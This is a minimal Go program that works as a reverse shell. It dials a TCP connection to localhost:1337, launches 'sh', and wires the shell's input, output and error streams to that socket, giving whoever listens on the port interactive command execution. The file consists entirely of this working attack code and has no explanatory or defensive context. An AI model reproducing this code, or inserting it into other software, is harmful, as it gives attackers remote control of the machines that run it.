package main

import "os/exec"
import "net"

func main() {
	c, _ := net.Dial("tcp", "localhost:1337")
	cmd := exec.Command("sh")
	cmd.Stdin = c
	cmd.Stdout = c
	cmd.Stderr = c
	cmd.Run()
}
